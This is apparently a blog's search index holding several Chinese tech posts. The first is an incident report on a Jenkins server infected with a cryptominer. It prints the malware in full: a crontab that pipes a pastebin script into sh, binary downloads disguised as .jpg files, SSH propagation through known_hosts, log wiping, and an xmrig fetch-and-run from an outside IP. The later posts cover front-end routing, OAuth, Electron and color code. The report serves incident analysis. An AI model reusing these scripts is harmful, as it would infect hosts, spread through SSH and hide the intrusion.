<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[记一次比特币病毒木马事件]]></title>
    <url>%2F2019%2F03%2F08%2FDevOps%2Fxmrig_script%2F</url>
    <content type="text"><![CDATA[记一次比特币病毒木马事件这两天开发同事突然反应代码无法上线,经排查是阿里云服务器不能正常git pull 代码. 开始排查.记录如下. 排查git第一感觉就是可能git问题,代码冲突. 1.手动pull 结果 :连接超时. 2.ping git.xxx.comgit.xxx.com 我们自建的git服务器,结果:git服务器正常.百思不得骑姐,本地git正常使用,其它服务器也正常使用.为什么从这台服务器访问不了22端口呢?考虑: 1,被git服务器防火墙加黑名单;2,这两天阿里云服务器抽风.主观直觉都是把坑扔给别人,谁让你们阿里云可用9999的. 3.排查git服务器关闭访问墙,查看黑名单都没有异常.因为git服务器是自建在内网.怀疑是联通又把我们的端口封了,这种事经常有.但使用外网其它服务器访问,都正常.所有把联通排除了.结论: git服务器正常. 所有矛头都指向了阿里云但在前一台晚上,重启一下服务器,竟然正常了.你说,阿里不背这个锅,谁背.今天也出问题了,也同样重启,发现不好使.想前几天阿里云监控报警短信,可能我们的服务器真的出问题了.第一感觉,我们没问题,是配置出问题了.于是乎,打开安全配置. 公网出,全OK.才想起来看消息,通知.妈呀,这是要炸啊!打开其中一条.阿里云把我们的对外22端口屏蔽了.怪不得安全设置都各种没有发现问题.原来是我们服务器在攻击了别人呀.就是中病毒了呗. 查毒进入服务器,病毒或木马最喜欢做的一件事,写定时脚本1crontab -e 妈呀,一条自动任务,在下载脚本运行呐1*/15 * * * * (curl -fsSL https://pastebin.com/raw/yPRSa0ki||wget -q -O- https://pastebin.com/raw/yPRSa0ki)|sh 先看文件是啥又下载另一个脚本,脚本内容长这样子 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162export PATH=$PATH:/bin:/usr/bin:/sbin:/usr/local/bin:/usr/sbinecho "*/10 * * * * (curl -fsSL https://pastebin.com/raw/yPRSa0ki||wget -q -O- https://pastebin.com/raw/yPRSa0ki)|sh" | crontab -ps -ef|grep -v grep|grep hwlh3wlh44lh|awk '&#123;print $2&#125;'|xargs kill -9ps -ef|grep -v grep|grep Circle_MI|awk '&#123;print $2&#125;'|xargs kill -9ps -ef|grep -v grep|grep get.bi-chi.com|awk '&#123;print $2&#125;'|xargs kill -9ps -ef|grep -v grep|grep hashvault.pro|awk '&#123;print $2&#125;'|xargs kill -9ps -ef|grep -v grep|grep nanopool.org|awk '&#123;print $2&#125;'|xargs kill -9ps -ef|grep -v grep|grep /usr/bin/.sshd|awk '&#123;print $2&#125;'|xargs kill -9ps -ef|grep -v grep|grep /usr/bin/bsd-port|awk '&#123;print $2&#125;'|xargs kill -9ps -ef|grep -v grep|grep "xmr"|awk '&#123;print $2&#125;'|xargs kill -9ps -ef|grep -v grep|grep "xig"|awk '&#123;print $2&#125;'|xargs kill -9ps -ef|grep -v grep|grep "ddgs"|awk '&#123;print $2&#125;'|xargs kill -9ps -ef|grep -v grep|grep "qW3xT"|awk '&#123;print $2&#125;'|xargs kill -9ps -ef|grep -v grep|grep "wnTKYg"|awk '&#123;print $2&#125;'|xargs kill -9ps -ef|grep -v grep|grep "t00ls.ru"|awk '&#123;print $2&#125;'|xargs kill -9ps -ef|grep -v grep|grep "sustes"|awk '&#123;print $2&#125;'|xargs kill -9ps -ef|grep -v grep|grep "thisxxs"|awk '&#123;print $2&#125;' | xargs kill -9ps -ef|grep -v grep|grep "hashfish"|awk '&#123;print $2&#125;'|xargs kill -9ps -ef|grep -v grep|grep "kworkerds"|awk '&#123;print $2&#125;'|xargs kill -9ps -ef|grep -v grep|grep "watchdog"|awk '&#123;print $2&#125;'|xargs kill -9ps -ef|grep -v grep|grep "/tmp/devtool"|awk '&#123;print $2&#125;'|xargs kill -9ps -ef|grep -v grep|grep "systemctI"|awk '&#123;print $2&#125;'|xargs kill -9ps -ef|grep -v grep|grep "watchdogs"|awk '&#123;print $2&#125;'|xargs kill -9ps -ef|grep -v grep|grep "ksoftirqds"|awk '&#123;print $2&#125;'|xargs kill -9ps -ef|grep -v grep|grep "suolbcc"|awk '&#123;print $2&#125;'|xargs kill -9ps aux|grep -v grep|grep -v kintegrityds|awk '&#123;if($3&gt;=80.0) print $2&#125;'|xargs kill -9yum -y install coreutils||apt-get -y install coreutilsapt-get install cron -y||yum install crontabs -y||apk add cron -yif [ ! -f "/tmp/.lsdpid" ]; then ARCH=$(uname -m) if [ $&#123;ARCH&#125;x = "x86_64x" ]; then (curl -fsSL http://sowcar.com/t6/677/1551954043x2890211684.jpg -o /tmp/kthrotlds||wget -q http://sowcar.com/t6/677/1551954043x2890211684.jpg -O /tmp/kthrotlds) &amp;&amp; chmod +x /tmp/kthrotlds elif [ $&#123;ARCH&#125;x = "i686x" ]; then (curl -fsSL http://sowcar.com/t6/677/1551954069x2890211684.jpg -o /tmp/kthrotlds||wget -q http://sowcar.com/t6/677/1551954069x2890211684.jpg -O /tmp/kthrotlds) &amp;&amp; chmod +x /tmp/kthrotlds else (curl -fsSL http://sowcar.com/t6/677/1551954069x2890211684.jpg -o /tmp/kthrotlds||wget -q http://sowcar.com/t6/677/1551954069x2890211684.jpg -O /tmp/kthrotlds) &amp;&amp; chmod +x /tmp/kthrotlds fi nohup /tmp/kthrotlds &gt;/dev/null 2&gt;&amp;1 &amp;elif [ ! -f "/proc/$(cat /tmp/.lsdpid)/stat" ]; then ARCH=$(uname -m) if [ $&#123;ARCH&#125;x = "x86_64x" ]; then (curl -fsSL http://sowcar.com/t6/677/1551954043x2890211684.jpg -o /tmp/kthrotlds||wget -q http://sowcar.com/t6/677/1551954043x2890211684.jpg -O /tmp/kthrotlds) &amp;&amp; chmod +x /tmp/kthrotlds elif [ $&#123;ARCH&#125;x = "i686x" ]; then (curl -fsSL http://sowcar.com/t6/677/1551954069x2890211684.jpg -o /tmp/kthrotlds||wget -q http://sowcar.com/t6/677/1551954069x2890211684.jpg -O /tmp/kthrotlds) &amp;&amp; chmod +x /tmp/kthrotlds else (curl -fsSL http://sowcar.com/t6/677/1551954069x2890211684.jpg -o /tmp/kthrotlds||wget -q http://sowcar.com/t6/677/1551954069x2890211684.jpg -O /tmp/kthrotlds) &amp;&amp; chmod +x /tmp/kthrotlds fi nohup /tmp/kthrotlds &gt;/dev/null 2&gt;&amp;1 &amp;fiif [ -f /root/.ssh/known_hosts ] &amp;&amp; [ -f /root/.ssh/id_rsa.pub ]; then for h in $(grep -oE "\b([0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;\b" /root/.ssh/known_hosts); do ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h '(curl -fsSL https://pastebin.com/raw/yPRSa0ki||wget -q -O- https://pastebin.com/raw/yPRSa0ki)|sh &gt;/dev/null 2&gt;&amp;1 &amp;' &amp; donefiecho 0&gt;/var/spool/mail/rootecho 0&gt;/var/log/wtmpecho 0&gt;/var/log/secureecho 0&gt;/var/log/cron# 就是下载脚本和文件,没有安装crontab就自动帮你安装,添加免密码登录等等. 那么 https://pastebin.com/ 是什么网站? 就是一个可以匿名在线使用的代码风格化工具,肯定木马使用者不会傻到拿自己服务器作脚本下载的.为什么是这个网站呢?1.可以匿名,记得国内有用豆瓣网做脚本的,查不到就怪了.2.可以使用Raw源代码输出; 随便一个人都可以在线写东西.所有到这里,基本上是找不到任何有用的东西. 找根源这脚本怎么来的?难道我们root密码泄漏了么?之前xshell被种后门,记忆犹新.我们也中招过.但怀疑是怀疑还得有根据.清空crontab后,又几分钟自动创建,完全清不掉呐. 查看对外网络情况1netstat 段错误,显示不全,这个netstat 可能查不了.换个方向,使用ss命令1ss 有两个明显的不熟悉的IP地址,因为我们服务IP地址少,一眼就能看出来异类的. 193.56.28.19134.209.104.20 这些端口都在变化,随机的:找到一个 ``` 12345![](http://img.hi-arkin.com/2019-03-08-15520487278687.jpg)查看一下进程.关键字 trace ./trace123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384搜索一下文件![](http://img.hi-arkin.com/2019-03-08-15520488808330.jpg)这不是jenkins的工作目录么.到这里我已经清楚来源了.jenkins是我布署的,我很清楚他的危害,想考侥幸混过去,等闲下来再去整理,没想到来得那么快.## Jenkins 自食其恶果![](http://img.hi-arkin.com/2019-03-08-15520491414252.jpg)登录jenkins后台,第一个任务就是这玩意,左下角任务不停的运行着.![](http://img.hi-arkin.com/2019-03-08-15520492031184.jpg)我们看一下,他都执行什么脚本.触发器![](http://img.hi-arkin.com/2019-03-08-15520492722210.jpg)每分钟运行一次,&quot;H&quot; 表示,hash.意思尽可能在每分钟内执行一个Job.执行完成,等下一分钟.看一下构建脚本![](http://img.hi-arkin.com/2019-03-08-15520495270442.jpg)贴一个完整的```bash#!/bin/bashif [[ $(whoami) != &quot;root&quot; ]]; then for tr in $(ps -U $(whoami) | egrep -v &quot;java|ps|sh|egrep|grep|PID&quot; | cut -b1-6); do kill -9 $tr || : ; done;else echo 128 &gt; /proc/sys/vm/nr_hugepages; sysctl -w vm.nr_hugepages=128;fithreadCount=$(lscpu | grep &apos;CPU(s)&apos; | grep -v &apos;,&apos; | awk &apos;&#123;print $2&#125;&apos; | head -n 1);hostHash=$(hostname -f | md5sum | cut -c1-8);echo &quot;$&#123;hostHash&#125; - $&#123;threadCount&#125;&quot;;_curl () &#123; read proto server path &lt;&lt;&lt;$(echo $&#123;1//// &#125;) DOC=/$&#123;path// //&#125; HOST=$&#123;server//:*&#125; PORT=$&#123;server//*:&#125; [[ x&quot;$&#123;HOST&#125;&quot; == x&quot;$&#123;PORT&#125;&quot; ]] &amp;&amp; PORT=80 exec 3&lt;&gt;/dev/tcp/$&#123;HOST&#125;/$PORT echo -en &quot;GET $&#123;DOC&#125; HTTP/1.0\r\nHost: $&#123;HOST&#125;\r\n\r\n&quot; &gt;&amp;3 (while read line; do [[ &quot;$line&quot; == $&apos;\r&apos; ]] &amp;&amp; break done &amp;&amp; cat) &lt;&amp;3 exec 3&gt;&amp;-&#125;rm -rf config.json;d () &#123; curl -L --insecure --connect-timeout 10 --max-time 55 --fail $1 -o $2 2&gt; /dev/null || wget --no-check-certificate --timeout 55 --tries 2 $1 -O $2 2&gt; /dev/null || _curl $1 &gt; $2;&#125;test ! -s trace &amp;&amp; \ d http://193.56.28.19:52343/xmrig.tar.gz trace.tgz trace.tgz &amp;&amp; \ tar -zxvf trace.tgz &amp;&amp; \ mv xmrig trace &amp;&amp; \ rm -rf trace.tgz;test ! -x trace &amp;&amp; chmod +x trace;k() &#123; ./trace \ -r 2 \ -R 2 \ --keepalive \ --no-color \ --nicehash \ --donate-level 0 \ --cpu-priority 3 \ --print-time 10 \ --threads $&#123;threadCount:-4&#125; \ --url $1 \ --user P \ --pass X \ --keepalive&#125;k 193.56.28.19:8080 || k 193.56.28.19:8080 开启代理服务这些都不是关键,关键是下载http://193.56.28.19:52343/xmrig.tar.gz这个文件.xmrig查一下就知道 这个就是比特币病毒.至此就结束了,剩下就是清空病毒,修改系统,最简单的方法,利用阿里云的镜像加回滚. 关于我们jenkin问题: 为了方便远程,我开启了公网访问 最关键还被搜索引擎收录了 管理员密码太简单了 为了方便运行脚本,把Jenkins的运行权限设太高 jenkin连接着所有服务器,攻破它就相当于攻破了城堡.]]></content>
      <categories>
        <category>DevOps</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Linux</tag>
        <tag>Jekins</tag>
        <tag>xmrig</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[路由事件]]></title>
    <url>%2F2019%2F03%2F04%2FJavascript%2Frouterlister%2F</url>
    <content type="text"><![CDATA[浏览器路由监听事件“路由”在任何http框架占有最重要的角色,可以说每个那框架都离不开路由,路由就是框架的核心.如前端的框架,如前端框架Vue.js,React.js,AngularJS…PHP框架,Laravel,ThinkPhp,CI…等. 我们今天说的路由,指的前端框架的路由.因为对vue-router和react-router 4,以这两个路由来实现.主要的路由事件钩子有:Before,Resolve,After,[Before 前置]离开或进入路由,在页面渲染前 [Resolve 确认]路由已经进行完成,不能修改,不能结束,等待页面渲染结束. [After 后置]在页面渲染结束后发生. Before 前置事件就是门卫,”从哪儿来到哪儿去的问题”这门卫还可以给你瞎指路,引导你去.一般用来做权限验证的.通过有个全局”门卫”和小部门”门卫”. Vue:[参考]1234567891011const router = new VueRouter(&#123; ... &#125;)router.beforeEach((to, from, next) =&gt; &#123; // ... //to:去哪的路由信息 //from: 来至哪 //next : 门卫开门指路方法 // 如果没运行next函数,就是门卫懒得不理你. next();// 给开门了,路自己去找吧吧 next('/login');// 指引你去登记处&#125;) React:由于React路由中没有全局中间件,React所有都是组件.我们可以在根路由组件里面分别实现. 进入事件 离开事件一般在根组件里面,如监听componentWillReceiveProps事件监听.shouldComponentUpdate事件阻断. 123456789101112131415161718import React from 'react';import &#123; Route,Prompt &#125; from 'react-router-dom';class App extends React.Component &#123; // 进入事件 componentDidMount()&#123; let to=this.props.location let from=undefined; console.log(to,from); &#125; //离开事件 shouldComponentUpdate(nextProps, nextState)&#123; let to=this.props.location let from=nextProps.location; console.log(to.pathname,form.pathname); return true;// 开门 return false;// 不开门 &#125;&#125; 旧版本路由使用routerWillLeave监听.新版本react-router v4以后.使用Prompt,由于没有v2版本,这里只例举.Prompt的用法. 1234567891011121314151617181920212223242526import React from 'react';import &#123;Route, Redirect,Prompt&#125; from 'react-router-dom';class App extends React.Component &#123; render()&#123; const HomePage= ()=&gt;(&lt;div&gt;home&lt;/div&gt;); const LoginPage= ()=&gt;(&lt;div&gt;login&lt;/div&gt;); const NotFound= ()=&gt;(&lt;div&gt;404&lt;/div&gt;); return ( &lt;div id="APP"&gt; &lt;Prompt message=&#123;(to)=&gt;&#123; let from=this.props.location; console.log(to); return true;// 跳转 return false;// 不跳转 &#125;&#125; /&gt; &lt;Route exact path="/home" component=&#123;HomePage&#125;/&gt; &lt;Route exact path="/login" component=&#123;LoginPage&#125;/&gt; &lt;Route render=&#123;NotFound&#125; /&gt; &lt;/div&gt; ); &#125;&#125; React中的权限判断最好使用高阶组件来完成.如这样的写法 Resolve 渲染事件路由已经完成,正在准备渲染了.vue通过router.beforeResolve事件来实现.123router.beforeResolve((to, from, next) =&gt; &#123; // ...&#125;) React通过组件的生命周期来实现.render();1 React和Vue区在于,Vue的路由是独立的,而React是组件的;vue先执行完成路由事件,再去渲染组件,顺序是子路由–&gt;根路由;React是全部组件从,父级–&gt;子级; After 渲染事件vuevue可以通过,所有路由完成状态123router.afterEach((to, from) =&gt; &#123; // ...&#125;) react没有全局钩子,只能约定通过高阶组件来统一管理路由状态.很难避免直接使用componet的情况.]]></content>
      <categories>
        <category>Javascript</category>
      </categories>
      <tags>
        <tag>History</tag>
        <tag>Vue Router</tag>
        <tag>React Router</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[OAuth授权原理]]></title>
    <url>%2F2019%2F03%2F01%2FPHP%2Foauth%2F</url>
    <content type="text"><![CDATA[OAuth授权原理 OAuth第三开放平台授权 绕口令: 第3方用户想获取第1方用户在第2方上的权限.如JD的QQ,微信授权登录. 举个生活中的例子,就明白了.1小明要取他爸爸王叔叔在招商银行存的500块钱. 角色: 用户 (王叔叔) 平台 (招商银行) 第三方 (小明) 分解步骤: 小明 找 王叔叔 签 授权书 王叔叔 签 授权书 ,并给小明 银行卡 小明 拿着 授权书 和 银行卡 到招商银行 取钱 招商银行 先验证小明的身份 招商银行 确定小明的身份没问题后,再验证 授权书 的内容无误然后再把钱给小明 上面就是一个简单的第三方授权,可以算上Oauth1.0;支票系统,可以算上OAuth2.0 支票的样子: 支票系统不需要用户的银行卡及密码. 支票的基本内容:平台: 招商银行用户: 出票人账号和签名第三方: 收款人模式类型: 转账/现金权限: 金额和用途时间: 有效期,开票日期 支票 相当于 AccessToken AccessToken主要包含以下内容: 授权方 代理方(第三方) 授权权限内容 有效期限 支票系统肯定包含很多细节,如支票的防伪,防篡改,鉴别,有效性.有记名支票,不记名支票. Oauth2.0 交易流程如下. 解释:认证服务器,如QQ开放平台,微信平方平台,微博开放平台等.第三方平台,指我们开发的第三方应用,如论坛,商城等.可以使用微信微博登录.用户,需要用微信等去登录第三方平台的用户.权限,一般平台,授权第三方获取用户头像,昵称,手机号,也有操作,如支付,发微博,分享朋友圈等. OAuth2.0关键点,授权码code,授权凭证AccessToken.其它都是这些实现过程的中安全控制,边界控制,操作记录,性能优化,防伪方案,账号系统,权限管理等等.]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>产品</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[History三种模hash,history,memory]]></title>
    <url>%2F2019%2F03%2F01%2FJavascript%2Frouter_history%2F</url>
    <content type="text"><![CDATA[JavaScript中History的三种模式区别 我们在前端做路由时,需要记录URL的历史.常见单页面,Vue,React应用]]></content>
      <categories>
        <category>Javascript</category>
      </categories>
      <tags>
        <tag>History</tag>
        <tag>Vue Router</tag>
        <tag>React Router</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[把故事讲好]]></title>
    <url>%2F2019%2F02%2F25%2FPM%2F2019-02-25%2F</url>
    <content type="text"><![CDATA[产品经理和导演(编剧)一样,需求会讲故事,把故事讲好. &lt;&lt;故事思维&gt;&gt;]]></content>
      <categories>
        <category>PM</category>
      </categories>
      <tags>
        <tag>产品经理</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[产品结构图,产品信息结构图,产品功能结构图]]></title>
    <url>%2F2019%2F02%2F22%2FProject%2Fmix%2F</url>
    <content type="text"><![CDATA[区分产品结构图,产品信息结构图,产品功能结构做项目中各种结构图经常弄混乱,导致权责不清楚.经常把自己”人格分裂”,同时充当很多角色.产品经理–项目经理–技术经理–架构师–研发工程师–UI设计–运维–运营–测试 结构图很多产品经理都没有做,只出需求文档,原型图.由于技术出生,习惯用理性的思想来做事,可以外脑来存储的,而不是感性的文字描述,有版本,可回归.除了给Boss看,尽量用excel,project,xmind来编写.反而注重结构,轻原型. 我喜欢的顺序是: 功能结构图 信息结构图 产品结构图/流程图 原型图/交互设计/UI设计/数据库设计/架构设计 任务计划安排/编写测试用例 开发 各结构图虽然有重复,但侧重点不一样. 功能结构图 作用: 梳理功能点 产品经理:罗列所有功能点及细节,如客户需求,老板需求,竞品功能,臆想的功能. 包含优先级,需求来源,注释 技术经理: 转化成任务,任务类型为功能,包含未完成,完成,关闭的功能,需要注明负责人,优先级,预期时间,开始时间,结束时间,依赖任务. 信息结构图 作用: 梳理所有信息数据与关系 数据库可以定信息类型,如布尔型,字符型,数据关联,字符长度 产品经理:罗列所有信息,要求 研发:定数据结构 产品结构作用: 展示所有功能,信息,交互综合之前功能结构,和信息结构,完善信息和功能,去掉不必要的功能和信息.补充那交互,设计图,原型图我认为产品结构是产品经理的最终产物,而不是某个网站,APP. Xmind的使用需求整理各种有理无理的需求,自己YY的需求等.草稿版使用xmind的灵感工具.如:]]></content>
      <categories>
        <category>Project</category>
      </categories>
      <tags>
        <tag>产品经理</tag>
        <tag>项目管理</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[electron生成pdf]]></title>
    <url>%2F2019%2F01%2F09%2FElectron%2Fconvert2pdf%2F</url>
    <content type="text"><![CDATA[electron生成pdf主要是html转pdf,pdf是打印用的文档,可以控制打印的格式.使用electron生成pdf的方式就很随意了.使用webview.toPDF(),NodeJS转化,NodeJS调用系统资源去生成都可以.下面主要讲 使用webview或webcontent生成PDF.注意:Electron的toPDF不支持页眉页脚设置.后面只能通过其它文案去修改页眉页脚了. 主要步骤 读取weburl 生成临时PDF文件 预览临时PDF 打印临时PDF 下载,上传PDF 读取URL在服务器使用php模板渲染生成html页面,写打印样式.统一使用A4纸标准.打印注意,请参考关于html打印相关文章. 下面都是基于electron-vue的代码.关键代码:]]></content>
      <categories>
        <category>NodeJs</category>
      </categories>
      <tags>
        <tag>Electron</tag>
        <tag>PDF</tag>
        <tag>Project</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Doc电子报告研发]]></title>
    <url>%2F2019%2F01%2F09%2FElectron%2Freport%2F</url>
    <content type="text"><![CDATA[Doc电子报告研发过程这是记录一次电子报告研发过程,口水记录.项目中需要生成电子报告; 一切不讲实际场景的解决方案都是耍牛氓. 场景 类似ERP系统,需要生成电子报告; 需要私网部署; 电子报告格式复杂,内容包含:富文本,公式,特殊字符,表格,图片,分页涵盖Word的功能; 内容长度不限制; 后台服务器主要使用PHP开发,但不限制PHP,NodeJS,Pyhton,Java,C++都可以; 服务器主要使用CentOS7 线下主要通过修改使用Word模板生成报告; 使用Word打印; Word有良好打印格式支持; 电子报告是必须流程; 解决方案HTML转WORD方案通过html生成pdf或word,也研究过markdown转word.虽然能达到要求,但是由于前端html的使用分辨率px来计算,打印使用点pi来计算,很难精确控制页面样式. html转pdf的方案工具很多,文档格式的瑞士军刀pandoc,很多格式都可以转换官网:http://www.pandoc.org/在macos,window,linux下都可以安装使用.常用转换格式,看下图 虽然很强大,但生成文档质量差强人意,个人使用可以,客户很挑,有可能为了个空格折腾一星期都解决不了. PHPWord方案设想通过word模板生成word,设想很美好,现实很骨感.PHPOffice的GitHub:https://github.com/PHPOffice/PHPWord 选型阶段,测试了几个简单的模板,文本变量替换完全没问题,就匆匆使用了.经过几天试用,完全解决不了问题.问题: 分块没法复制 表格生成有问题 库Bug太多,很多千年bug没有修复 复制的数据结构完全就蒙逼了 打开文本写入会丢失原word样式 模板正则有问题,兼容性也存在问题. 文档太差,没法入手 Bug太多,有很多需要修改源码才能使用,时间紧就没有使用.迫切使用第二方案. 在线Word解析地址:http://www.xdocin.com这个云模板,支持很多数据结构,直接调用API就能使用,可以生成word,pdf.也是基于word模板变量替换方式来完成的.一些简单的结构还比较OK,格式不会丢失. 缺点和问题: 基于对象的模板变量,虽然可以支持多层结构的数据 ,但是有个缺点,就是不能跨页,如果数据量多超就显示不全. 对象就是Word”文本框”来实现. 无故多空白,串行等现象 无法支持运算 富文本不支持 公式不支持 图片很难调整 不支持私有布署 不开源,有问题只能面对黑洞 Python方案回到原点,PHPWord虽然可以能写入任意内容,但是质量效率都成问题.我们考虑使用其它语言方案,不能在一棵树上吊死.选择一门稍微快速入手的语言,Python.git:https://github.com/python-openxml/python-docx 通过python生成api,然后使用php去调用.python-docx,可以私有化布署,支持富文本与公式,调整样式等自定义操作. 缺点: 复增加杂度跨语言,维护难度增加 已经失去word模板的用处,基本上是创建word. 不能可视化,调整很复杂. 由于word的格式与html常用的富文本不一样,比如公式表达不一样.前端UI后word需要两套处理方案. 通过上面几次选型,决定再回归到最初html方案,直接导出PDF,不在生成word.减少复杂度. 需要解决问题: 报告生成 报告预览 UI和报告一至 减少复杂度 支持定制化的所有要求 浏览器兼容性 跨平台 因为ERP有大量打印需要,自定义打印内容,硬件交互,本地文件处理的需要.这次直接使用封装html方案,来避规这些问题,通过选型,我们使用了Electron方案. 参考后面&lt;&lt;electron生成pdf&gt;&gt;文章 WebOffice方案如果需要真正可被化在线编辑Word,只能使用在线文档编辑控件了.这个布署复杂,收费,难以自定义. 官方office online:https://products.office.com/zh-cn/office-online/documents-spreadsheets-presentations-office-online 服务器不跨不平台且收费,客户端跨平台免费使用. 这个方案,算是最后的稻草,基于能省则省的原则,到最后再尝试.]]></content>
      <categories>
        <category>NodeJs</category>
      </categories>
      <tags>
        <tag>Electron</tag>
        <tag>PDF</tag>
        <tag>Project</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[通过背景色设置文字颜色]]></title>
    <url>%2F2019%2F01%2F07%2FJavascript%2FisLight%2F</url>
    <content type="text"><![CDATA[通过背景色设置文字颜色 有这么一个需求,用户设置选择一个主题颜色,计算出背景色和文字颜色. 通过分析需求,需要最简单的实现方案,背景色和主题色,文字为背景色的对比色.对比色,可以简单的两种,黑或白色,根据背景色的明暗度使用白或黑. 获取色值的明暗度明暗度,通过两种色彩模式获取. PS中,HSV(HSB)色彩模式:H:色相 (0-360)S:饱和度 (0-100%)V:亮度 (0-100%) 在CSS中只支持HSL色彩模式:H:色相 (0-360)S:饱和度 (0-100%)L:明度 (0-100%) 纯红色:RGB(255,0,0)在不同色彩模式的表现. HSV,为0,100%,100% HSL,为0,100%,50% HSl更适合人类眼睛,通过观察我们只需要判断HSl色彩模式的L就可以了.L:50%时,使用明或暗都可以. 使用JS转换色值因为前端考虑兼容性,CSS常用两种色彩模式,RGB的十进制和十六进制.透明度暂时不考虑. HEX转RGB参考公式:__12345678910111213141516171819202122var colorRgb = function(sColor)&#123; sColor = sColor.toLowerCase(); //十六进制颜色值的正则表达式 var reg = /^#([0-9a-fA-f]&#123;3&#125;|[0-9a-fA-f]&#123;6&#125;)$/; // 如果是16进制颜色 if (sColor &amp;&amp; reg.test(sColor)) &#123; if (sColor.length === 4) &#123; var sColorNew = "#"; for (var i=1; i&lt;4; i+=1) &#123; sColorNew += sColor.slice(i, i+1).concat(sColor.slice(i, i+1)); &#125; sColor = sColorNew; &#125; //处理六位的颜色值 var sColorChange = []; for (var i=1; i&lt;7; i+=2) &#123; sColorChange.push(parseInt("0x"+sColor.slice(i, i+2))); &#125; return "RGB(" + sColorChange.join(",") + ")"; &#125; return sColor;&#125;; RGB转HSL参考网上的公式函数 12345678910111213141516171819202122232425262728293031/** * RGB 颜色值转换为 HSL. * 转换公式参考自 http://en.wikipedia.org/wiki/HSL_color_space. * r, g, 和 b 需要在 [0, 255] 范围内 * 返回的 h, s, 和 l 在 [0, 1] 之间 * * @param Number r 红色色值 * @param Number g 绿色色值 * @param Number b 蓝色色值 * @return Array HSL各值数组 */function rgbToHsl(r, g, b) &#123; r /= 255, g /= 255, b /= 255; var max = Math.max(r, g, b), min = Math.min(r, g, b); var h, s, l = (max + min) / 2; if (max == min)&#123; h = s = 0; // achromatic &#125; else &#123; var d = max - min; s = l &gt; 0.5 ? d / (2 - max - min) : d / (max + min); switch(max) &#123; case r: h = (g - b) / d + (g &lt; b ? 6 : 0); break; case g: h = (b - r) / d + 2; break; case b: h = (r - g) / d + 4; break; &#125; h /= 6; &#125; return [h, s, l];&#125; 明暗度判断明暗度是基于人眼的感光程度来的,可以选择一个舒适的取值范围,下面是我的人眼取值. 通过L值判断,在大于60左右为”亮”. 直接通过RGB值来判断也可,比值公式 (0.213 rgb[0] + 0.715 rgb[1] + 0.072 * rgb[2]) &gt;255/2 完成 项目中对色盘认识不够,不然可以取亲合一点的对比色,那就完美了. 我主要用于electron封装壳主题色改变,electron和web是两套系统,只能通过 html中的meta来获取web当前的主题,从而改变标题栏等颜色. html中: electron-vue中 mounted(): 12345678// themewebview.addEventListener('did-change-theme-color', (e,themeColor) =&gt; &#123; if(e.themeColor)&#123; this.theme=e.themeColor this.changeTheme(e.themeColor); &#125;&#125;); method()中 1234567891011121314151617181920212223242526272829303132333435363738394041changeTheme(themeColor)&#123; themeColor=themeColor.toLowerCase(); const reg = /^#([0-9a-fA-f]&#123;3&#125;|[0-9a-fA-f]&#123;6&#125;)$/; let rgbColor=[]; // 十六进制转换RGB if (reg.test(themeColor)) &#123; if (themeColor.length === 4) &#123; rgbColor[0]=parseInt("0x"+themeColor.substr(1,1)+themeColor.substr(1,1)+themeColor.substr(1,1)); rgbColor[1]=parseInt("0x"+themeColor.substr(2,1)+themeColor.substr(2,1)+themeColor.substr(2,1)); rgbColor[2]=parseInt("0x"+themeColor.substr(3,1)+themeColor.substr(3,1)+themeColor.substr(3,1)); &#125;else&#123; rgbColor[0]=parseInt("0x"+themeColor.substr(1,2)); rgbColor[1]=parseInt("0x"+themeColor.substr(2,2)); rgbColor[2]=parseInt("0x"+themeColor.substr(4,2)); &#125; &#125;else if(/^(rgb|RGB)/.test(themeColor))&#123; rgbColor = themeColor.replace(/(?:\(|\)|rgb|RGB)*/g, "").split(","); &#125; // 获取颜色明暗度 let isLight=false; if(rgbColor)&#123; let isLightValue =(0.213 * rgbColor[0] +0.715* rgbColor[1] +0.072 * rgbColor[2]); // 人眼明暗度 0.213,0.715,0.072 isLight=isLightValue &gt;155; //console.log(themeColor,isLightValue); &#125;else&#123; themeColor='#5b6270'; isLight=false; &#125; const TextColor=isLight?'#333':'#f5f5f5'; this.themeStyle=&#123; color:TextColor, background:themeColor &#125; &#125;]]></content>
      <categories>
        <category>Javascript</category>
      </categories>
      <tags>
        <tag>颜色</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Electron Build 安装使用]]></title>
    <url>%2F2018%2F12%2F24%2FElectron%2Felectron-rebuild%2F</url>
    <content type="text"><![CDATA[Electron Build 安装使用NodeJs原生插件因为版本系统问题,需要重新编译. Electron环境下,最好固定版本,备份定指定版本数据,避免NPM或源被和谐.electron有快捷build方法. 依赖node,npm electron-rebuild官方文档(cn) 安装node-gyp参考: https://githnpmub.com/nodejs/node-gyp [window系统]window使用Windows-Build-Tools工具快捷安装各种依赖. powershell/cmd中安装,使用管理员方式运行123yarn global add windows-build-tools#或npm install windows-build-tools -g [MacOS]Mac默认有python2.7,只需要安装node-gyp123npm install node-gyp -g或yarn global add node-gyp 安装electron-rebuildGitHub 1npm install --save-dev electron-rebuild 运行编译 123./node_modules/.bin/electron-rebuild# 或windows.\node_modules\.bin\electron-rebuild.cmd 由于网络原因,尽量使用yarn.然而淘宝源不太干净,会导致各种神奇的原因.]]></content>
      <categories>
        <category>Electron</category>
      </categories>
      <tags>
        <tag>Electron</tag>
        <tag>NodeJs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Node获取Usb信息]]></title>
    <url>%2F2018%2F12%2F20%2FElectron%2Fusb%2F</url>
